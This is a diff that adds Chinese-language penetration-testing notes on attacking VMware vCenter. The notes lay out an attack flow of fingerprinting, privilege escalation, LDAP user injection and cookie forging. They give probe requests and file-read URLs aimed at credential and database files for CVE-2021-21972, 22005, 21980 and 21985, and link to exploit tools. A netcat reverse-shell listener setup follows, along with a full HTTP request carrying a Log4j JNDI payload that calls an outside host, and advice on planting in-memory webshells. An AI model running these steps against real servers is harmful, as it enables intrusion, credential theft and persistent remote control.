@@ -330,3 +330,162 @@ https://www.jianshu.com/p/833582b2f560
 
 通过CBC字节翻转攻击，假如我们能够触发加解密过程，并且能够获得每次加密后的密文。那么我们就能够在不知道key的情况下，通过修改密文或IV，来控制输出明文为自己想要的内容，而且只能从最后一组开始修改，并且每改完一组，都需要重新获取一次解密后的数据，要根据解密后的数据来修改前一组密文的值。
 
+
+
+Vcenter系列漏洞检测利用
+
+vcenter版本获取  /sdk/vimServiceVersions.xml
+攻防流程
+
+1、判断vcenter版本
+
+2、扫描是否存在相关漏洞
+
+3、低权限-提权-高权限
+
+4、ldap添加用户、伪造cookie获取web后台权限
+
+5、获取后台锁屏机器权限
+
+
+1. CVE-2021-21972 – 未授权远程代码执行（vSphere Client 插件）
+一 ，漏洞描述
+
+CVE-2021-21972 vmware vcenter的一个未授权的命令执行漏洞。该漏洞可以上传一个webshell至vcenter服务器的任意位置，然后执行webshell即可。
+
+vSphere Client（HTML5）在 vCenter Server 插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放 443 端口的服务器向 vCenter Server 发送精心构造的请求，从而在服务器上写入 webshell，最终造成远程任意代码执行。在 CVE-2021-21972 VMware vCenter Server 远程代码漏洞 中，攻击者可直接通过443端口构造恶意请求，执行任意代码，控制vCenter。
+
+二  受影响版本及漏洞评级
+
+VMware vCenter Server 7.0系列 < 7.0.U1c
+
+VMware vCenter Server 6.7系列 < 6.7.U3l
+
+VMware vCenter Server 6.5系列 < 6.5 U3n
+
+三 复现
+title="+ ID_VC_Welcome +"
+
+访问未授权接口/ui/vropspluginui/rest/services/updateova
+如果页面返回状态码为200、405，则可能存在漏洞
+
+ https://github.com/NS-Sp4ce/CVE-2021-21972
+
+
+2. CVE-2021-22005 – 任意文件上传导致远程代码执行
+漏洞描述
+
+VMware是一家云基础架构和移动商务解决方案厂商，提供基于VMware的虚拟化解决方案。2021年9月22日，VMware 官方发布安全公告，披露了包括 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞在内的多个中高危严重漏洞。在CVE-2021-22005中，攻击者可构造恶意请求，通过vCenter中的Analytics服务，可上传恶意文件，从而造成远程代码执行漏洞。
+
+漏洞影响
+
+针对 CVE-2021-22005 VMware vCenter Server 任意文件上传漏洞
+VMware vCenter Server 7.0系列 < 7.0 U2c
+VMware vCenter Server 6.7系列 < 6.7 U3o
+VMware vCenter Server 6.5系列 不受漏洞影响
+其余漏洞受影响版本可参考 
+
+https://www.vmware.com/security/advisories/VMSA-2021-0020.html
+安全版本：
+VMware vCenter Server 7.0 U2c
+VMware vCenter Server 6.7 U3o
+
+复现
+curl -k -v "https://$VCENTER_HOST/analytics/telemetry/ph/api/level?_c=test"
+•如果服务器以 200/OK 和响应正文中除“OFF”以外的任何内容（例如“FULL”）进行响应，则它很容易受到攻击
+
+
+3. CVE-2021-21980 任意文件读取漏洞
+影响范围
+
+vCenter Server 6.7
+
+vCenter Server 6.5
+
+Cloud Foundation (vCenter Server) 3.x
+
+漏洞利用
+可读取postgresql数据库配置文件
+http://x.x.x.x/eam/vib?id=c:\programData\Vmware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+直接读取data.mdb文件，提取cookie，登录后台
+https://x.x.x.x/eam/vib?id=C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
+
+4.CVE-2021-21985 – vSAN 插件远程代码执行
+描述：vSphere Client（HTML5）中的 vSAN Health Check 插件存在远程代码执行漏洞，攻击者可调用未授权方法执行代码。
+影响版本
+
+VMware vCenter Server 7.0系列 < 7.0.U2b
+
+VMware vCenter Server 6.7系列 < 6.7.U3n
+
+VMware vCenter Server 6.5系列 < 6.5 U3p
+
+VMware Cloud Foundation 4.x 系列 < 4.2.1
+
+VMware Cloud Foundation 4.x 系列 < 3.10.2.1
+
+出网利用
+
+工具链接：
+
+https://github.com/r0ckysec/CVE-2021-21985
+
+用法如下：
+
+1、在vps
+
+java -jar JNDIInjection-Bypass.jar 1099 <监听port>
+2、在vps
+
+# nc接收反弹shell
+
+nc -lvvp <监听port> 
+
+3、攻击机：
+python cve-2021-21985_exp.py
+
+
+
+条件：
+
+需要目标出网
+
+如果目标不出网，可以尝试研究下原理，打个内存马。
+
+
+
+不出网利用
+
+工具链接：
+
+https://github.com/r0ckysec/CVE-2021-21985
+
+具体原理：
+
+利用ClassPathXmlApplicationContext类加载xml文件触发spel注入，weblogic和jackson都有关于这个类的cve，利用方式都差不多。
+
+https://github.com/alt3kx/CVE-2021-21985_PoC?tab=readme-ov-file
+
+4.CVE-2021-44228 Log4j
+xff header jndi注入内存马
+
+漏洞成因是Vcenter的SAML路由中，可以通过增加XFF头触发漏洞，把需要执行的命令跟在XFF后面。
+
+目录攻击url: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
+x-forwarded-for:{jndi}
+GET/websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
+Host: 192.168.121.137
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Dnt: 1
+X-Forwarded-For: ${jndi:ldap://9qphlt.dnslog.cn}
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+DNSlog探测漏洞是否存在; 内网 不出网，可以在内网搭建ldap。  直接注入内存马
